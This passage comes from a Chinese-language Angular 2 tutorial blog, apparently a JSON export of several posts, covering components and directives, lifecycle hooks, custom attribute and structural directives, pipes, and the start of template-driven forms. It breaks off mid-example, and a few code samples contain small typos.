组件组件是被用来构造带有自定义行为的可重用视图，组件与指令的结构类似，均使用装饰器描述元数据，二者均在各自对应的类中实现具体业务逻辑，最基本的组件和指令的结构示例：12345678910111213141516// Component@Component(&#123; selector: 'hello-world', template: '&lt;div&gt;hello world&lt;/div&gt;'&#125;)class HelloWorldComponent&#123; // ...&#125;// Directive@Directive(&#123; selector: 'myHelloWorld'&#125;)class HelloWorldDirective&#123; // ...&#125; 可以看出，组件和指令的基本结构非常相似，差别在于组件中包含了模板，组件作为指令的一个子类，它的部分生命周期钩子与指令的相同。 组件和指令相同的钩子方法如下表： 钩子方法 作用 ngOnInit 在Angular完成初始化输入属性的数据绑定后，初始化指令/组件 ngOnChanges 在Angular初始化输入属性的数据绑定前响应一次，之后当检测到数据绑定发生变化后就会被调用，这个方法接收一个包含当前和之前数据的SimpleChanges对象 ngDoCheck 用于变化监测，该钩子方法会在每次变化监测发生时调用 ngOnDestroy 在Angular销毁指令/组件之前执行清理工作，此时应注销观察者对象或解绑事件处理器以避免内存泄漏 尽管组件和指令有相似的结构和一些相同的生命周期方法，但它们也有一些不同点，不同于属性指令和结构指令，组件不是以HTML元素属性的形式使用，而是以自定义标签的形式使用，原因在于组件带有模板。组件可作为对HTML元素的扩展，将自身的模板视图插入至DOM中，而属性指令和结构指令是对HTML元素属性的扩展，作用是扩展已有DOM元素的行为和样式，或改变这些元素在DOM中的结构。 正因为指令中不仅有模板，因此在组件中，围绕模板视图的初始化和更新的生命周期钩子是组件独有而指令所没有的： ngAfterContentInit ngAfterContentChecked ngAfterViewInit ngAftetViewChecked 内置指令Angular内置了一些常用的指令，根据这些指令使用场景的不同，可将其划分为3个类别： 通用指令 路由指令 表单指令 通用指令在Angular应用中经常会用到的指令，Angular将通用指令包含在CommonModule模块中，当需要使用通用指令时，本应在模块中引入CommonModule模块，而Angular的BrowserModule模块已包含了CommonModule模块，所以引入BrowserModule后间接引入了CommonModule。 NgTemplateOutlet、NgPlural、NgPluralCase指令属于相对交生僻的指令，应用场景较少。 表单指令表单指令包含了一系列在Angular表单中使用的指令，这些指令分别被包含在三个模块中： FormsModule ReactiveFormsModule InternalFormsSharedModule FormsModule模块包含NgModel、NgModelGroup、NgForm指令和InternalFormsSharedModuel模块中包含的指令。 ReactiveFormsModule模块包含FormControlDirective、FormGroupDirective、FormControlName、FormGroupName、FormArrayName指令和InternalFormsSharedModuel模块中包含的指令。 InternalFormsSharedModuel模块是Angular的内部模块，在该模块包含的指令中，第一部分为表单元素访问器指令： DefaultValueAccessor NumberValueAccessor CheckboxControlValueAccessor RadioControlValueAccessor SelectControlValueAccessor、SelectMultipleControlValueAccessor 这些访问器指令是Angular表单的内部指令，在应用中无需主动使用，它们是DOM元素和表单输入控件之间的桥梁。 其中ControlValueAccessor是其他访问器指令的父接口，抽象了Angular控件与DOM元素交互的公共方法，ControlValueAccessor接口定义了3个方法：12345export interface ControlValueAccessor&#123; writeValue(obj: any): void; // 向DOM元素写入新值的方法 registerOnChange(fn: any): void; // 用于监听DOM元素值变更的方法 registerOnTouched(fn: any): void; // 用于监听DOM元素触摸事件的方法&#125; 对应不同的数据输入类型，表单指令集合提供了各自的访问器类： DefaultValueAccessor为text文本输入框的访问器 CheckboxControlValueAccessor为checkbox复选框的访问器 RadioControlValueAccessor为radio单选框的访问器，RadioButtonState保存单选框的选中状态和选中的值 NumberValueAccessor为number数字输入框的访问器 SelectControlValueAccessor为select下拉框的访问器，NgSelectOption指令动态地标记option选项，选项变更时，Angular会收到通知 第二部分为选择框选项指令： NgSelectOption NgSlectMultipleOption上述指令为Angular内部指令，它们动态地标记选择框的option选项 第三部分为表单验证指令： RequiredValidator指令为表单输入元素增加required约束 MinLengthValidator指令为表单输入元素增加minlength约束 MaxLengthValidator指令为表单输入元素增加maxlength约束 PatternValidator指令为表单输入元素增加正则表达式约束，输入内容必须符合正则表达式定义的模式 最后一部分为控件状态指令： NgControlStatus NgControlStatusGroup这些指令无需主动使用，是内部指令，会自动根据控件是否通过验证、是否被触摸等状态来设置元素的CSS类。 路由指令路由指令中： RouterOutlet指令是一个占位符、路由跳转时，Angular会查找当前匹配的组件并将组件插入到RouterOutlet中 RouterLinkActive指令在当前路径与元素设置的链接匹配时为元素添加CSS样式 RouterLink指令使得应用可以链接到特定的组件 自定义属性指令以自定义一个属性指令BeautifulBackgroundDirective为例，在单击按钮时改变其背景色 实现属性指令一个属性指令需要一个控制器类，该控制器类使用@Directive装饰器来装饰，@Directive装饰器指定了用以标记指令所关联属性的选择器、控制器类则实现了指令所对应的特定行为。1234567891011// beautifulBackground.directive.tsimport &#123; Directive, ElementRef &#125; from '@angular/core';@Directive(&#123; selector: '[myBeautifulBackground]' // 此处的[]不可忽略&#125;)export class BeautifulBackgroundDirective&#123; construtctor(el: ElementRef)&#123; el.nativeElement.style.backgroundColor = 'yellow'; &#125;&#125; Angular会为每一个匹配的DOM元素创建一个指令实例，同时将ElementRef作为参数注入到控制器构造函数。使用ElementRef服务，可以在代码中通过其nativeElement属性直接访问DOM元素，这样就可以通过DOM API设置元素的背景颜色。 使用自定义指令到组件中：12345678// app.component.tsimport &#123; Component &#125; from '@angular/core';@Componet(&#123; selector: 'my-app', template: `&lt;div myBeautifulBackground&gt;按钮&lt;/div&gt;`&#125;)export class AppComponent&#123; &#125; 123456789101112// app.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; AppComponent &#125; from './app.component';import &#123; BeautifulBackgroundDirective &#125; from './beautifulBackground.directive';@NgModule(&#123; imports: [BrowserModule], declarations: [AppComponent, BeautifulBackgroundDirective], bootstrap: [AppComponent]&#125;)export class AppModule&#123;&#125; 运行时，Angular会在组件div元素上解析到myBeautifulBackground属性，然后创建BeautifulBackgroundDirective指令类的实例，将元素的引用传入构造函数，用以设置元素的样式。 为指令绑定输入作为自定义指令，为了增加灵活性，可以在指令外部使用绑定的方式设置背景色：1&lt;div [myBeautifulBackground]=\"color\"&gt;按钮&lt;/div&gt; 为了给指令绑定外部变量，需要为指令声明一个可绑定的输入属性backgroundColor，需要在属性上使用@Input装饰器，@Input标识使得属性具有绑定能力，可将外部变量的值绑定到指令的属性中。123456789// ...@Directive(&#123; selector: '[myBeautifulBackground]' // 此处的[]不可忽略&#125;)export class BeautifulBackgroundDirective&#123; @Input('myBeautifulBackground') backgroundColor: string; // ...&#125; 上述@Input(&#39;myBeautifulBackground&#39;)装饰器中，为输入属性backgroundColor指定了myBeautifulBackground别名，这里指定的别名与指令在@Directive装饰器中定义的选择器名称一致，这不是必须的，之所以定义成一样的，是为了在元素中使用指令时，不必再使用另外的名称来绑定输入变量。若将别名定义为其他的，比如@Input(&#39;myBackgroundColor&#39;)，则需要在组件中绑定这个属性：1&lt;div myBeautifulBackground [myBackgroundColor]=\"color\"&gt;按钮&lt;/div&gt; 若在装饰器中不指定别名，即：12@Input() backgroundColor: string 则模板用法为：1&lt;div myBeautifulBackground [backgroundColor]=\"color\"&gt;按钮&lt;/div&gt; 以上的color变量可以来自多个地方，比如组件中定义的变量，或组件模板的输入元素等。1234&lt;input type=\"radio\" name=\"colors\" (click)=\"color='green'\" /&gt; 绿&lt;input type=\"radio\" name=\"colors\" (click)=\"color='red'\" /&gt; 红&lt;div [myBeautifulBackground]=\"color\"&gt;按钮&lt;/div&gt; 同时，为了在输入属性backgroundColor的值变更时响应改变元素样式，可以将backgroundColor属性用set方法重写：1234567891011121314151617181920212223import &#123; Directive, ElementRef, Input &#125; from '@angular/core';@Directive(&#123; selector: '[myBeautifulBackground]' // 此处的[]不可忽略&#125;)export class BeautifulBackgroundDirective&#123; private _defaultColor = 'yellow'; private el: HTMLElement; // 重写backgroundColor属性的set方法 @Input('myBeautifulBackground') set backgroundColor(colorName: string)&#123; this.setStyle(colorName); &#125; construtctor(el: ElementRef)&#123; this.el = el.nativeElement; this.setStyle(_defaultColor); &#125; private setStyle(color: string)&#123; this.el.style.backgroundColor = color; &#125;&#125; 响应用户操作在为指令绑定了输入属性后，可以根据输入值动态地变更元素样式。 为了实现用户单击按钮时改变元素的样式，需要在事件处理函数上添加@HostListener装饰器。 @HostListener装饰器指向使用属性指令的DOM元素，使得DOM元素的事件与指令关联起来，除此外，可以直接为DOM元素添加事件监听器，但不建议这样做，因为有如下3个问题： 必须正确编写监听器 必须在指令销毁前移除监听器，避免内存泄漏 会直接操作DOM API，这是应该避免的因此，才会需要使用@HostListener装饰器来实现这个事件处理函数：123456// ...@HostListener('click')onClick()&#123; this.setStyle(this.backgroundColor || this._defaultColor);&#125;// ... 这样就可以根据用户操作来改变元素样式了，而不是在输入属性变更时触发样式更新.用户点击元素时，可以根据绑定的输入属性的值。 修改后的指令代码：12345678910111213141516171819202122232425262728import &#123; Directive, ElementRef, Input &#125; from '@angular/core';@Directive(&#123; selector: '[myBeautifulBackground]' // 此处的[]不可忽略&#125;)export class BeautifulBackgroundDirective&#123; private _defaultColor = 'yellow'; private el: HTMLElement; // 重写backgroundColor属性的set方法 @Input('myBeautifulBackground') set backgroundColor(colorName: string)&#123; this.setStyle(colorName); &#125; construtctor(el: ElementRef)&#123; this.el = el.nativeElement; this.setStyle(_defaultColor); &#125; @HostListener('click') onClick()&#123; this.setStyle(this.backgroundColor || this._defaultColor); &#125; private setStyle(color: string)&#123; this.el.style.backgroundColor = color; &#125;&#125; 当使用&lt;div [myBeautifulBackground]=&quot;&#39;red&#39;&quot;&gt;按钮&lt;/div&gt;模板后，初始时，div的背景色是黄色，点击div后，颜色为红色。 自定义结构指令以实现一个和NgIf指令作用相反的Unless指令为例，当表达式值为false时渲染模板内容，为true时将移除模板内容。 实现结构指令与自定义属性指令类似，创建自定义结构指令涉及如下内容： 引入@Directive装饰器 添加CSS属性选择器，用来标识指令 声明一个input属性用以绑定表达式 将装饰器应用在指令实现类上 初始内容如下：123456import &#123; Directive, Input &#125; from '@angular/core';@Directive(&#123;selector: '[myUnless]'&#125;)export class UnlessDirective&#123; @Input('myUnless') condition: boolean;&#125; Unless指令需要访问组件模板内容，并且需要可以渲染组件模板内容的工具，通过使用TemplateRef和ViewContainerRef服务实现，TemplateRef用来访问组件的模板，而ViewContainerRef作为视图内容渲染器，将模板内容插入到DOM中，TemplateRef和ViewContainerRef服务来自@angular/core,在指令的构造函数中，需要将它们作为依赖注入，赋值给指令的变量。123456//...constructor( private templateRef: TemplateRef&lt;any&gt;, private viewContainer: ViewContainerRef)&#123;&#125;//... 在组件中使用Unless指令时，需要为指令绑定一个值为布尔类型的表达式或变量，指令根据绑定结果增加或删除模板内容，为了在接收到绑定结果时实现这一逻辑，需要为condition属性设置一个set方法：12345678@Input('myUnless')set condition(newCondition: boolean)&#123; if(!newCondition)&#123; this.viewContainer.createEmbeddedView(this.templateRef); &#125;else&#123; this.viewContainer.clear(); &#125;&#125; 通过调用渲染器的createEmbeddedView()方法和clear()方法，实现根据输入属性的值、添加和删除模板内容。 最终Unless指令的代码如下：12345678910111213141516171819import &#123; Directive, Input, TemplateRef, ViewContainerRef &#125; from '@angular/core';@Directive(&#123;selector: '[myUnless]'&#125;)export class UnlessDirective&#123; @Input('myUnless') set condition(newCondition: boolean)&#123; if(!newCondition)&#123; this.viewContainer.createEmbeddedView(this.templateRef); &#125;else&#123; this.viewContainer.clear(); &#125; &#125; constructor( private templateRef: TemplateRef&lt;any&gt;, private viewContainer: ViewContainerRef )&#123;&#125;&#125; 在组件的模板中使用Unless指令：123&lt;p *myUnless=\"boolValue\"&gt; myUnless的值是false&lt;/p&gt;&lt;p *myUnless=\"!boolValue\"&gt; myUnless的值是true&lt;/p&gt; 模板标签与星号前缀前面实现的Unless自定义结构指令，并未涉及模板标签（&lt;template&gt;）和星号前缀（*）. 模板标签结构指令在将模板内容从DOM树中添加和移除时，使用了HTML5新增的&lt;template&gt;标签。 在&lt;template&gt;中定义的内容，默认的CSS样式display属性为none，&lt;template&gt;标签中定义的脚本代码不会被执行，图片不会被加载，标签中的元素也不能被类似getElementById()方法访问。 在普通的HTML代码中使用&lt;template&gt;标签，通过Chrome开发者工具可以查看生成的DOM树，在HTML页面中，&lt;template&gt;标签内容被#document-fragment包装。而在Angular中，&lt;template&gt;标签和内容被移除，在&lt;template&gt;标签处仅留下一行注释 星号前缀在Unless指令前，有一个星号前缀，星号是使用结构指令的语法糖，使用星号前缀可以简化对结构指令的使用，Angular会将带有星号的指令引用替换成带有&lt;template&gt;标签的代码，对比用星号前缀和&lt;template&gt;标签方式来使用Unless指令。1234567&lt;!-- 使用星号方式 --&gt;&lt;p *myUnless=\"condition\"&gt; *星号方式中的myUnless, condition为false&lt;/p&gt;&lt;!-- 使用`&lt;template&gt;`标签方式 --&gt;&lt;template [myUnless]=\"condition\"&gt; &lt;p&gt; template标签中的myUnless, condition为false&lt;/p&gt;&lt;/template&gt; 上述两种方式效果一样，Angular会将使用星号前缀的方式转换成&lt;template&gt;标签方式，并做一些如指令、属性绑定的特殊处理。 比如NgFor的使用，其实也是这样：1234567&lt;!-- 使用星号方式 --&gt;&lt;p *ngFor=\"let contact of contacts\"&gt;&#123;&#123; contact &#125;&#125;&lt;/p&gt;&lt;!-- 使用`&lt;template&gt;`标签方式 --&gt;&lt;template ngFor let-contact [ngForOf]=\"contacts\"&gt; &lt;p&gt;&#123;&#123; contact &#125;&#125;&lt;/p&gt;&lt;/template&gt; 在上述代码标签的使用中，ngFor是指令的选择器，[ngForOf]绑定指令的输入属性，即将contacts集合绑定给[ngForOf]作为指令的输入，let-contact创建了一个模板局部变量contact。 NgIf指令原理在Web中，可以将display设置为none来隐藏目标元素，虽然这些元素不可见但仍然保存在DOM中，这样的好处是若元素不久就需要再次显示，组件不需要重新被初始化，组件的状态因为之前被保留所以可以马上显示。但在Angular应用里，问题是若隐藏一个元素，但它仍然暴露在DOM树中，Angular会继续检查那些可能发生变化的数据绑定，组件的所有行为将会保持，这种情况下，组件及其所有的子节点仍然会占用资源，消耗更多的内存，从而影响性能。 使用NgStyle指令可以通过改变样式将元素隐藏，当在组件中使用NgStyle指令进行如下设置时，可以将组件在DOM树中隐藏：1&lt;div [ngStyle]=\"&#123;'display':'none'&#125;\"&gt;display none&lt;/div&gt; NgIf指令的不是通过样式隐藏的，与Unless一样，根据输入变量布尔值，其值为false时元素从DOM中移除，停止监测相关组件绑定的属性是否有变化，释放它的DOM事件监听器并且销毁组件，组件将会被垃圾回收且释放内存。NgIf的实现如下：12345678910111213141516171819202122import &#123; Directive, Input, TemplateRef, ViewContainerRef &#125; from '@angular/core';import &#123; isBlank &#125; from '../facade/lang';@Directive(&#123;selector: '[ngIf]', inputs: ['ngIf']&#125;)export class NgIf&#123; private _prevCondition: boolean = null; constructor( private _templateRef: TemplateRef&lt;Object&gt;, private _viewContainer: ViewContainerRef )&#123;&#125; set ngIf(newCondition: any /* boolean */)&#123; if(newCondition &amp;&amp; (isBlank(this._prevCondition) || !this._prevCondition))&#123; this._prevCondition = true; this._viewContainer.createEmbeddedView(this._templateRef); &#125;else if(!newCondition &amp;&amp; (isBlank(this._prevCondition) || this._prevCondition))&#123; this._prevCondition = false; this.viewContainer.clear(); &#125; &#125;&#125; 在Unless指令中，指令通过@Input()装饰器绑定了输入属性，而在NgIf中，以键值对形式为inputs元数据赋值，效果是一致的。 在NgIf的@Directive装饰器有两个键值对，selector属性为[ngIf],然后将inputs属性赋值为[ngIf],为指令绑定一个输入属性，它的值和指令选择器的值相同。 虽然NgIf和Unless指令的实现代码很相似，但不同于Unless，在NgIf中设置的_prevCondition变量用于记录上次表达式的值，并在自定义输入属性的set()方法中，对_prevCondition变量做变更检查，这样在每次输入属性变更时，可以避免不必要的操作，从而提高性能。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-模板-3","slug":"angular6","date":"2017-10-07T09:15:51.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/07/angular6/","link":"","permalink":"https://github.com/xmoyKING/2017/10/07/angular6/","excerpt":"","text":"管道在Angular中，管道（Pipes）可以按照指定的规则将模板内的数据进行转换。 使用管道，需要用管道操作符|来链接模板表达式中左边的输入数据和右边的管道：123456789@Component(&#123; selector: 'pipe-demo', template: ` &lt;p&gt;My Birthday is &#123;&#123; birthday | date &#125;&#125;&lt;/p&gt; `&#125;)export class PipedemoComponent&#123; birthday = new Date(1999, 3, 22);&#125; 输出结果为My Birthday is Apr 22, 1999 管道参数管道可以使用参数，通过传入的参数来输出不同格式的数据，如日期需要以固定格式输出，可以给日期管道添加参数1&lt;p&gt;My Birthday is &#123;&#123; birthday | date:\"MM/dd/y\" &#125;&#125;&lt;/p&gt; 输出结果为My Birthday is 04/22/1999 链式管道一个模板表达式可以连续使用多个管道进行不同的处理，就是链式管道，语法格式为：1&#123;&#123; expression | pipeName1 | pipeName2 | ...&#125;&#125; 模板表达式expression的值依次传递，直到最后一个管道处理完毕，输出最终结果。 内置管道Angular根据业务场景，封装了一些常用的内置管道，内置管道可以直接在任何模板表达式中被使用，不需要通过import导入和在模块中声明。 Angular提供的内置管道如下表： 管道 类型 功能 DatePipe 纯管道 日期管道，格式化日期 UpperCasePipe 纯管道 将文本所有小写字母转成大写字母 LowerCasePipe 纯管道 将文本所有大写字母转成小写字母 DecimalPipe 纯管道 将数值按特定的格式显示文本 CurrencyPipe 纯管道 将数值转换成本地货币格式 PercentPipe 纯管道 将数值转换成百分比格式 JsonPipe 非纯管道 将输入数据对象经过JSON.stringify()方法转换后输出对象字符串 SlicePipe 非纯管道 将数组或字符串裁剪成新子集 详情可查看Angular2 Pipe文档 自定义管道虽然Angular提供了内置管道，但数据转换涉及各种各样的格式，内置管道显然无法满足全部需求，因此需要使用Angular提供的自定义管道功能来实现更多的需求。 以一个性别转换（female-&gt;女，male-&gt;男）的自定义管道为例。1.定义元数据使用@Pipe定义元数据前必须从@angular/core中引入Pipe和PipeTransform，示例代码如下：1234567// sexreform.pipe.tsimport &#123; Pipe, PipeTransform &#125; from '@angular/core';@Pipe(&#123;name: 'sexReform'&#125;)export class SexReform implements PipeTransform &#123; // ...&#125; 通过@Pipe装饰器来告诉Angular这个是一个管道类，@Pipe的元数据有一个name属性，用来指定管道名称，这个名称必须是有效的JS标识符，此处将管道命名为sexReform。 2.实现transform方法自定义管道必须继承接口类PipeTransform，同时自定义管道必须实现PipeTransform接口的transform()方法,该方法的第一个参数为需要被转换的值，后面可以有若干个可选转换参数，该方法需要返回一个转换后的值。12345678910// ...export class SexReform implements PipeTransform &#123; transform(val: string): string &#123; switch(val) &#123; case 'male' : return '男'; case 'female' : return '女'; default : return '未知性别'; &#125; &#125;&#125; 3.使用自定义管道在组件模板中使用自定义管道之前，必须在@NgModule的元数据declarations数组中添加自定义管道。1234567import &#123; SexReform &#125; from 'pipes/sexreform.pipe';// ...@NgModule(&#123; //... declarations: [SexReform]&#125;) 添加到declarations数组后，然后就可以在模板中像内置管道一样使用自定义管道了12345678// ...@Component(&#123; selector: 'pipe-demo-custom', template: ` &lt;p&gt;&#123;&#123; sexValue | sexReform &#125;&#125;&lt;/p&gt; `&#125;)// ... 管道的变化监测Angular在每次点击、移动鼠标、定时器触发以及服务器响应等事件后都会对数据绑定进行变化监测，而频繁的变化监测会引起性能问题。但可以通过使用管道让Angular选择使用更简单、更快速的变换监测策略来提高性能。 以通过管道实现过滤联系人列表功能为例：123456789101112131415161718192021// ...@Pipe(&#123;name: 'selectContact'&#125;)export class SelectContactPipe implements PipeTransform &#123; transform(allContacts: Array, prefix: string)&#123; return allContacts.filter(contact =&gt; contact.name.match('^'+prefix)); &#125;&#125;@Component(&#123; selector: 'pipe-demo', template: ` &lt;input type=\"text\" #box (keyup.enter)=\"addContact(box.value); box.value=''\" placeholder=\"输入联系人后回车添加\" /&gt; &lt;div *ngFor=\"let contact of (contacts | selectContactPipe: '李')\"&gt;&#123;&#123; contact.name &#125;&#125;&lt;/div&gt; `&#125;)export class PipeDemoComponent&#123; contacts = [&#123;name: '张三'&#125;,&#123;name:\"李四\"&#125;]; addContact(name:string)&#123; this.contacts.push(&#123;name&#125;); &#125;&#125; 上述代码，定义了一个过滤联系人的管道SelectContactPipe，并传入姓字符串“李”，联系人列表经过管道过滤，只显示姓“李”的联系人。若在文本框控件中输入一个新联系人“李无”，然后回车触发addContact()方法，将新联系人加入数组中，此时预料中联系人列表应该会实现显示新的“李无”联系人，但结果无变化，还是只有“李四”。 因为Angular管道的变换监测策略对性能进行了优化，这种检测策略会忽略检查列表内部数据的变化，上例中使用this.contacts.push(contact)新增一个联系人，数组对象引用没有发生变化，从Angular角度上，引用地址不变的数组不进入SelectContactPipe筛选管道，所以列表数据没有更新，页面不会实时显示更新后的联系人数组，这种筛选管道称为纯管道，虽然纯管道优化了性能，但有时却不符合需求，要实现需求就需要Angular的另外一个变化监测机制。 纯管道在模板表达式中使用纯管道（Pure Pipe）后，只有在监测到输入值发生纯变更时才会调用纯管道的transform()方法来实现数据转换，从而将数据更新到页面上，纯变更是指对基本数据类型（String、Number、Boolean等）输入值的变更或对对象引用（Date、Array、Function、Object等）的更改。 以DatePipe日期转换管道为例，分别用String类型和Date类型的对象作为输入值，对日期进行格式化，同时设定一个2s的定时器，用来动态改变日期的月份：1234567891011121314151617181920// ...@Component(&#123; selector: 'pure-pipe-demo', template: ` &lt;div&gt; &lt;p&gt;'&#123;&#123; dateObj | date: \"y-MM-dd HH:mm:ss EEEE\" &#125;&#125;'&lt;/p&gt; &lt;p&gt;'&#123;&#123; dateStr | date: \"y-MM-dd HH:mm:ss EEEE\" &#125;&#125;'&lt;/p&gt; `&#125;)export class PurePipeDemoComponent&#123; dateObj: date = new Date('2016-06-08 20:05:05'); dateStr: string = '2016-06-08 20:05:05'; constructor()&#123; setTimeout(() =&gt; &#123; this.dateObj.setMonth(11); this.dateStr = '2016-12-08 20:05:05'; &#125;, 2000); &#125;&#125; 结果，两个日期字符串开始日期一致，都是’2016-06-08 20:05:05’，2s后，dateStr变化，而dateObj则无变化。因为dateStr的引用发生了变化，被赋值为另外一个常量字符串，而dateObj的引用没有变化。在模板表达式中使用纯管道DatePipe，只有当输入值发生纯变更后才会调用该管道并更新变化的值。 纯管道的变化监测策略是基于判断基本类型的数据值或对象的引用是否被改变来监测对象变化的，对象引用的监测方式比遍历对象内部所有属性值的监测方式要快得多，这样能快速的判断是否可以跳过执行管道并更新视图。 非纯管道使用非纯管道（Impure Pipe），Angular组件在每个变换监测周期都会调用非纯管道，并执行管道的transform()方法来更新页面数据，可以在管道元数据里将pure属性值设置为false来定义非纯管道。1234@Pipe(&#123; name: 'selectContact', pure: false&#125;) 在Angular的内置管道里，SlicePipe、AsyncPipe、JsonPipe属于非纯管道。以非纯异步管道（AsyncPipe）为例，非纯异步管道需要接收Promise或Observable对象作为输入，并自动订阅这个输入，最终返回该异步操作产生的值：12345678910111213141516171819import &#123; Component, OnInit &#125; from '@agular/core';import &#123; Observable, Subscriber &#125; from '@rxjs/Rx';@Component(&#123; selector: 'impure-pipe-demo', templat: ` &lt;p&gt; 时间: &#123;&#123; time | async &#125;&#125; `&#125;)export class ImpurePipeDemoComponent implements OnInit&#123; time: Observable&lt;string&gt;; constructor()&#123;&#125; ngOnInit()&#123; this.time = new Observable&lt;string&gt;((observer: Subscriber&lt;string&gt;) =&gt; &#123; setInterval(()=&gt; observer.next(new Date().toLocaleString()), 1000); &#125;) &#125;&#125; 上例中，使用非纯异步管道将一个时间字符串time的Observable绑定到视图中，通过异步管道实现了每隔1s切换时间的时钟效果。 安全导航操作符Angular的模板表达式在某些特定场景中允许使用一些特殊的链接操作符，如管道操作符|，安全导航操作符?. 1&lt;p&gt;&#123;&#123; detail.telNum &#125;&#125;&lt;/p&gt; 假设模板变量detail没被赋值，在Angular会因为报错而导致程序无法运行。一般解决方案为：1&lt;p&gt;&#123;&#123; detail &amp;&amp; detail.telNum &#125;&#125;&lt;/p&gt; 但当碰到多级属性路径时，继续使用这种&amp;&amp;判断方式将会导致代码较为臃肿，后期维护比较困难。Angular的安全导航操作符?.可以用来规避因为属性路径中出现null或undefined值而出现的错误。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-模板-2","slug":"angular5","date":"2017-10-07T06:31:28.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/07/angular5/","link":"","permalink":"https://github.com/xmoyKING/2017/10/07/angular5/","excerpt":"","text":"表单表单的使用场景非常广泛，常见的场景为登录注册，数据添加修改，文件上传等。虽然HTML内置了一些表单标签，但它的一些标签特性存在浏览器兼容问题，并且自定义校验规则，表单数据获取，处理，提交等流程比较复杂。 Angular提供了模板驱动（Template-Driven Forms）及模型驱动（Model-Driven Forms）两种方式来构建表单，模板驱动模式使用模板表单内置指令、内置校验的方式来构建表单；模型驱动模式采用自定义表单、自定义校验方式来构建表单。 模板表单通过通讯录例子了解模板中的表单，在添加联系人的表单中，需手机联系人姓名、电话、住址、邮箱、生日等信息，在模板中加入表单及其控件元素，创建文件form.component.ts:12345678910111213141516171819202122//form.component.ts//...@Component(&#123; selector: 'add-contact', template: ` &lt;h3&gt;添加联系人&lt;/h3&gt; &lt;form&gt; &lt;ul&gt; &lt;li&gt; &lt;label for=\"name\"&gt;姓名：&lt;/label&gt; &lt;input type=\"text\" name=\"name\" /&gt; &lt;/li&gt; &lt;!-- ... --&gt; &lt;li&gt; &lt;button type=\"submit\"&gt;添加&lt;/button&gt; &lt;button type=\"button\"&gt;取消&lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; `&#125;)export class FormComponent&#123;&#125; 上述仅仅只是实现了一个简单的表单视图，并未添加任何交互处理，在Angular中，表单的交互是由表单的特有指令实现的。 表单指令表单指令是指Angular对常用表单交互功能尽量封装扩展，其目的是负责处理数据绑定、指定校验规则、显示校验错误信息等，最终使开发者能在模板中快速构建交互友好的表单。 表单指令涉及知识点及其联系如下： NgForm指令NgForm指令是表单的控制中心，负责处理表单内的页面逻辑，为普通的表单元素扩充了许多额外的特性，所有的表单指令都需要在NgForm指令内部才能正常运行。 使用NgForm指令需要在根模块中添加：12345678910111213141516171819//app.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; FormsModule &#125; from '@angular/forms';import &#123; AppComponent &#125; from './app.component';import &#123; FormComponent &#125; from './form.component';@NgModule(&#123; imports: [ BrowserModule, FormsModule ], declarations: [ AppComponent, FormComponent ], bootstrap: [AppComponent]&#125;)export class AppModule &#123;&#125; 上述代码，导入了FormsModule模块和FormComponent组件，将FormComponent组件添加到@NgModule元数据的declarations数组中，其目的是在整个模块中都可以使用FormComponent组件，将FormsModule模块添加到@NgModule元数据的imports数组中，这使得整个应用的模板驱动表单中都可以使用特有的表单指令。 接下来就可以在FormComponent组件的模板中显示使用NgForm指令，因为添加了FormsModule模块后，Angular模板在编译解析时，遇到form标签会自动创建一个NgForm指令并且将其添加到该form标签上。 NgForm指令控制了通过NgModel指令和name属性创建的控件类，并且也会跟踪控件类的属性变化，包括有效性属性（valid）。 NgModel指令NgModel指令是表单数据绑定的核心所在，是表单运用中最重要的一个指令，几乎所有的表单特性都依赖NgModel指令实现。NgModel指令实现了表单控件的数据绑定，提供了控件状态跟踪及校验功能，Angular表单支持单向和双向数据绑定，表单的单向数据绑定使用了[ngModel],双向数据绑定使用[(ngModel)]：12&lt;input type=\"text\" name=\"contactName\" [ngModel]=\"curContact.name\" /&gt;&lt;input type=\"text\" name=\"contactName\" [(ngModel)]=\"curContact.name\" /&gt; 在控件中使用NgModel属性绑定，必须给该控件添加name属性，否则会报错，因为NgForm指令会为表单建立一个空间对象FormControl的集合，以此来作为表单控件的容器。控件的NgModel属性绑定会以name作为唯一标识符来注册并生成一个FormControl，将其加入到FormControl的集合中。 一些常用的表单控件：单选框：单选框控件（Radio）实现双向数据绑定，同一组单选框控件的所有[(ngModel)]属性都必须绑定同一个模型数据，且name属性也必须相同：12&lt;input type=\"radio\" name=\"sex\" [ngModel]=\"curContact.sex\" value=\"female\"/&gt;女&lt;input type=\"radio\" name=\"sex\" [(ngModel)]=\"curContact.sex\" value=\"male\"/&gt;男 复选框：复选框（Checkbox）用于表示表单复选框是否被选中，[(ngModel)]属性绑定的是一个布尔值：1&lt;input type=\"checkbox\" name=\"lock\" [ngModel]=\"curContact.lock\" /&gt;禁用 单选下拉框单选下拉框控件（Select）的双向数据绑定，需要结合option元素绑定的值来实现，option选项的元素属性的绑定目标有两种，分别为value和ngValue，当在option元素中使用value绑定数据时，其返回值类型是基本数据类型，当使用ngValue绑定数据时，其返回值类型是对象数据类型。 在构建下拉框前，需要先定义下拉框列表所需的数据：123456789export class FormComponent &#123; interests: any[] = [ &#123;value: 'reading', display: '阅读'&#125;, &#123;value: 'traveling', display: '旅游'&#125;, &#123;value: 'sport', display: '运动'&#125;, ]; // ...&#125; 接下来实现一个例子：123456789&lt;!-- 单选框被选中后返回基本数据类型 --&gt;&lt;select name=\"interestValue\" [(ngModel)]=\"curContact.interestValue\"&gt; &lt;option *ngFor=\"let interest of interests\" [value]=\"interest.value\"&gt;&#123;&#123; interest.display 